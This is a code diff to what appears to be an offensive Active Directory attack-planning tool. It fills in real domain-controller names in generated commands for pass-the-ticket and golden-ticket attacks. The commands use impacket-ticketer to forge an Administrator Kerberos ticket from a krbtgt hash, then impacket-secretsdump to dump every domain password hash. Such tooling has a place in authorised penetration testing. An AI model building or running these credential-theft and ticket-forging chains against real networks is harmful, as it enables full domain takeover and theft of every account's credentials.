@@ -577,10 +577,11 @@ def run(report, store, ui=None):
     if e.has_ccache:
         s, l = e.ccache_src
         _dom_r26 = store.dominant_domain() or "<DOMAIN>"
+        _dc_fqdn_r26 = store.dc_fqdn() or "<DC-FQDN>"
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
             commands=[f"export KRB5CCNAME=<ticket.ccache>; "
-                      f"impacket-secretsdump -k -no-pass {_dom_r26}/<user>@<DC-FQDN>   "
+                      f"impacket-secretsdump -k -no-pass {_dom_r26}/<user>@{_dc_fqdn_r26}   "
                       f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
             src=s, line=l))
     # shadow
@@ -722,6 +723,8 @@ def run(report, store, ui=None):
         _sid_note = "" if _sid_gt.startswith("S-") else (
             "\n# Look up the domain SID first (impacket-lookupsid or from any "
             "user's Evidence.meta.principal_sid)")
+        # iter-48: use real DC FQDN when known
+        _dc_fqdn_gt = store.dc_fqdn() or "<DC-FQDN>"
         chains.append(Chain("R-GOLDEN", "golden ticket",
             f"krbtgt NT hash present -> forge Administrator TGT (score 15)",
             crit=10, conf=1.0, ready=1.5, prox=1.0,         # score 15.0
@@ -729,7 +732,7 @@ def run(report, store, ui=None):
                 f"impacket-ticketer -nthash {e.krbtgt_hash} "
                 f"-domain-sid {_sid_gt} -domain {dom_gt} Administrator{_sid_note}",
                 f"export KRB5CCNAME=Administrator.ccache",
-                f"impacket-secretsdump -k -no-pass '{dom_gt}/Administrator@<DC-FQDN>'   "
+                f"impacket-secretsdump -k -no-pass '{dom_gt}/Administrator@{_dc_fqdn_gt}'   "
                 f"# every domain hash",
             ], src=s_gt, line=l_gt))
 
